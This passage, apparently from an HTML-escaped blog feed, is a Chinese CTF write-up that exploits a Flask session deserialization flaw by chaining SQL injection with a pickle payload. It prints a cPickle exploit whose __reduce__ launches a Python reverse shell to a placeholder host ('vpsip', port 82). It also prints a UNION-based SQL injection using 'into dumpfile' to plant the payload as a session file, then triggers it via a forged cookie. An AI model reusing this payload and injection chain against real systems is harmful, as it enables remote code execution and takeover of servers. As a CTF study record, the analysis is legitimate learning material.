-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到对key进行了MD5加密&lt;/p&gt;
-
-&lt;p&gt;再搜索调用&lt;code&gt;get()&lt;/code&gt;方法的地方&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/S2Qaa&#34; alt=&#34;get()&#34; /&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def open_session(self, app, request):
-    sid = request.cookies.get(app.session_cookie_name)
-    if not sid:
-        sid = self._generate_sid()
-        return self.session_class(sid=sid, permanent=self.permanent)
-    if self.use_signer:
-        signer = self._get_signer(app)
-        if signer is None:
-            return None
-        try:
-            sid_as_bytes = signer.unsign(sid)
-            sid = sid_as_bytes.decode()
-        except BadSignature:
-            sid = self._generate_sid()
-            return self.session_class(sid=sid, permanent=self.permanent)
-    data = self.cache.get(self.key_prefix + sid)
-    if data is not None:
-        return self.session_class(data, sid=sid)
-    return self.session_class(sid=sid, permanent=self.permanent)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;发现在&lt;code&gt;app/Mysessions.py&lt;/code&gt;处理session部分的方法调用了&lt;code&gt;get&lt;/code&gt;，传进去的参数是&lt;code&gt;self.key_prefix + sid&lt;/code&gt;，即&lt;code&gt;前缀+session&lt;/code&gt;值，类似这个样子
-&lt;code&gt;bdwsessions855f1297-d81e-4366-aaaa-80c9edb87338&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;配置文件里看到&lt;code&gt;SESSION_FILE_DIR = &amp;quot;/tmp/ffff&amp;quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;所以整个流程大致是这样:&lt;/p&gt;
-
-&lt;p&gt;用户注册或登录，取得cookie中的session值，加上前缀后再对文件名进行MD5加密，存储在&lt;code&gt;/tmp/ffff&lt;/code&gt;目录下&lt;/p&gt;
-
-&lt;p&gt;在验证用户的过程中，对&lt;code&gt;/tmp/ffff&lt;/code&gt;目录相应文件名文件进行反序列化，假如我们对文件名和文件内容可控，那么就可以造成漏洞&lt;/p&gt;
-
-&lt;p&gt;结合上一个sql注入漏洞，我们可以&lt;code&gt;select evilcode into outfile &#39;/tmp/ffff/md5&#39;;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;在访问页面的时候修改session值为md5对应的明文，就可以让程序反序列化含有恶意代码的md5文件&lt;/p&gt;
-
-&lt;p&gt;修改上面序列化代码:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import cPickle
-import os
-import subprocess
-class Exploit(object):
-    def __reduce__(self):
-        return (subprocess.Popen, (&amp;quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;vpsip\&amp;quot;,82));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/sh\&amp;quot;,\&amp;quot;-i\&amp;quot;]);&#39;&amp;quot;,))
-shellcode = cPickle.dumps(Exploit())
-print &#39;0x&#39; + shellcode .encode(&#39;hex&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;假设我们要设置session为testabcd，对应的&lt;code&gt;bdwsessionstestabcd&lt;/code&gt;md5值为&lt;code&gt;209a05e8b11c8e74ab03c110e6e5d591&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;构造sql语句&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;select id from user where email = &#39;test&#39;/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/&#39;/tmp/ffff/209a05e8b11c8e74ab03c110e6e5d591&#39;#@test.com&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这样就把十六进制的恶意代码写入了&lt;code&gt;/tmp/ffff/&lt;/code&gt;下&lt;/p&gt;
-
-&lt;p&gt;然后访问index，修改cookie的session值为&lt;code&gt;testabcd&lt;/code&gt;，触发反序列化漏洞后反弹shell&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/mYzKP&#34; alt=&#34;reverse_shell&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;总结：
-- RPO可以结合XSS进行攻击，开发时不注意的话容易被利用
-- 反序列化问题一直都存在，这道题中虽然代码比较简单，利用起来还是有几个坑，还需要多学习&lt;/p&gt;
 </description>
     </item>
     
